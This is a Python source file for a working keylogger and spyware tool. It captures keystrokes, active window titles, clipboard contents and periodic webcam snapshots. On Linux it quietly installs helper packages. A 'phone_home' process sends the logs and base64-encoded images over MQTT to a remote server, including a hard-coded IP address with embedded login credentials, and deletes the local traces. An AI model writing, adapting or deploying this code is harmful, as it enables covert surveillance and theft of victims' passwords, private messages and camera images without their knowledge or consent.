from time import sleep
from multiprocessing import Process, Queue, freeze_support, Lock
from psutil import pid_exists, Process as pid
from datetime import datetime
from platform import system as platform

from config import username, password, hostname


# utf8 encoding enabler
import sys
reload(sys)
sys.setdefaultencoding('utf8')
# ----------------------

process_tracker_queue = Queue()


def write_log(text, mutex):
    if text:
        mutex.acquire()
        with open("kl.log", "a+") as f:
            f.write(text)
        mutex.release()


def observe_context(mutex, parent_id, procq):
    procq.put("active_window " + str(pid().pid))
    if "Linux" in platform():
        from subprocess import STDOUT, check_call, check_output
        import os
        try:
            check_call(['apt-get', 'install', '-y', 'xdotool'],
                stdout=open(os.devnull,'wb'), stderr=STDOUT) 
        except:
            pass
        old_window = u''
        while True:
            sleep(0.8)
            try:
                window = check_output("xdotool getactivewindow getwindowname", shell=True)
                
                if "Window : "+window not in old_window:
                    old_window = u'\nWindow : '+window+u'\n'
                    write_log(old_window, mutex)
            except:
                pass
            if not pid_exists(parent_id):
                pid().kill()
    else:
        from win32gui import GetWindowText, GetForegroundWindow
        old_window = u''
        while True:
            sleep(0.8)
            try:
                if GetWindowText(GetForegroundWindow()) not in old_window:
                    old_window = u'\nWindow : '+GetWindowText(GetForegroundWindow())+u'\n'
                    write_log(old_window, mutex)
            except:
                pass
            if not pid_exists(parent_id):
                pid().kill()


def observe_clipboard(mutex, parent_id, procq):
    procq.put("clipboard " + str(pid().pid))
    if "Linux" in platform():
        from subprocess import STDOUT, check_call
        import os
        try:
            check_call(['apt-get', 'install', '-y', 'xclip'],
                stdout=open(os.devnull,'wb'), stderr=STDOUT) 
        except:
            pass
    from pyperclip import paste as clipboard
    clip = u''
    while True:
        sleep(2)
        try:
            if clipboard() not in clip:
                clip = u'\nClip : '+clipboard()+u'\n'
                write_log(clip, mutex)
        except:
            pass
        if not pid_exists(parent_id):
            pid().kill()


def text_checker_dump(mutex, parent_id, procq):
    from keyboard import on_press, on_release
    procq.put("keylog "+str(pid().pid))

    class tcd_global:
        prev_key = u''

    def mapper(key):
        if "shift" in key:
            if key in tcd_global.prev_key:
                tcd_global.prev_key = key
                return ''
            else:
                tcd_global.prev_key = key
                return "<shift>"
        elif "ctrl" in key:
            if key in tcd_global.prev_key:
                tcd_global.prev_key = key
                return ''
            else:
                tcd_global.prev_key = key
                return "<ctrl>"
        elif "backspace" in key:
            return "<backspace>"
        elif "space" in key:
            return " "
        elif "enter" in key:
            return "\n"
        elif "caps lock" in key:
            return "<CAPS>"
        elif "tab" in key:
            return "<tab>"
        elif "up" in key:
            return "<up>"
        elif "down" in key:
            return "<down>"
        elif "left" in key:
            return "<left>"
        elif "right" in key:
            return "<right>"
        else:
            return key

    def release_mapper(key):
        tcd_global.prev_key = ''
        if "shift" in key:
            return "</shift>"
        elif "ctrl" in key:
            return "</ctrl>"
        else:
            return ''

    def key_pressed(key_event):
        keyname = mapper(key_event.name)
        write_log(keyname, mutex)

    def key_released(key_event):
        keyname = release_mapper(key_event.name)
        write_log(keyname, mutex)

    on_press(key_pressed)
    on_release(key_released)

    while True:
        sleep(3)
        if not pid_exists(parent_id):
            pid().kill()


def send_to_server(mutex, parent_id, procq):
    import paho.mqtt.client as mqtt
    import paho.mqtt.publish as pub
    from getpass import getuser as User
    import socket
    from os import remove
    from glob import glob
    from base64 import b64encode

    procq.put("send_to_server " + str(pid().pid))

    def is_connected():
        try:
            host = socket.gethostbyname("www.google.com")
            socket.create_connection((host, 80), 2)
            return True
        except:
            pass
        return False

    while True:
        if not pid_exists(parent_id):
            pid().kill()
        if is_connected():
            file_content = u''
            mutex.acquire()
            try:
                with open("kl.log", "rb+") as f:
                    file_content = f.read()
            except IOError:
                pass
            mutex.release()

            if file_content:
                pub.single('comp/'+User()+'/text', payload=file_content, qos=1, retain=False, hostname=hostname,
                           port="1883", client_id="", keepalive=60, will=None,
                           auth={'username': username, 'password': password}, tls=None,
                           protocol=mqtt.MQTTv311)

            try:
                remove("kl.log")
            except:
                pass

            jpgs = glob("*.jpg")
            for jpg in jpgs:
                jpgdata = ''
                with open(jpg,'rb+') as f:
                    jpgdata = b64encode(f.read())
                pub.single('comp/' + User() + '/webcam', payload=jpgdata, qos=1, retain=False,
                           hostname="72.14.176.217",
                           port="1883", client_id="", keepalive=60, will=None,
                           auth={'username': "vspectrum", 'password': "Asakura4410"}, tls=None,
                           protocol=mqtt.MQTTv311)
                remove(jpg)
        sleep(35)


def process_tracker(parent_id, processes_queue):
    sleep(10)
    process_dict = {}
    while True:
        if not pid_exists(parent_id):
            pid().kill()
        while not processes_queue.empty():
            ps = processes_queue.get().split(" ")
            process_dict[ps[0]] = ps[1]
        sleep(10)


def cam_capture(parent_id, procq):
    procq.put("webcam " + str(pid().pid))
    from os import stat, remove, devnull
    if "Linux" in platform():
        from subprocess import STDOUT, check_output, check_call
        try:
            check_call(['apt-get', 'install', '-y', 'fswebcam'],
                stdout=open(devnull,'wb'), stderr=STDOUT) 
        except:
            pass

        def get_snap():
            filename = str(datetime.now()).replace(':', '-')[:-7] + '.jpg'
            snapshot_cmd = "fswebcam -r 640x480 -S 5 -s brightness=65% --jpeg 90 '"+filename+"'"
            window = check_output(snapshot_cmd, shell=True)
            if stat(filename).st_size < 13000:
                remove(filename)
                sleep(30)

        while True:
            if not pid_exists(parent_id):
                pid().kill()
            get_snap()
            sleep(30)
                

    else:
        from VideoCapture import Device    
        def get_snap():
            filename = str(datetime.now()).replace(':', '-')[:-7] + '.jpg'
            cam = Device()
            cam.saveSnapshot(filename, quality=60, timestamp=1, textpos='br')
            del cam
            if stat(filename).st_size < 13000:
                remove(filename)
                sleep(30)

        while True:
            if not pid_exists(parent_id):
                pid().kill()
            get_snap()
            sleep(30)


if __name__ == '__main__':
    freeze_support()

    parent_pid = pid().pid

    mutex_for_file = Lock()
    input_dump = Process(target=text_checker_dump, args=(mutex_for_file, parent_pid, process_tracker_queue))
    input_dump.start()

    window_title = Process(target=observe_context, args=(mutex_for_file, parent_pid, process_tracker_queue))
    window_title.start()

    clipboard_data = Process(target=observe_clipboard, args=(mutex_for_file, parent_pid, process_tracker_queue))
    clipboard_data.start()

    phone_home = Process(target=send_to_server, args=(mutex_for_file, parent_pid, process_tracker_queue))
    phone_home.start()

    webcam_data = Process(target=cam_capture, args=(parent_pid, process_tracker_queue))
    webcam_data.start()

    tracker = Process(target=process_tracker, args=(parent_pid, process_tracker_queue))
    tracker.start()

    while True:
        sleep(5)
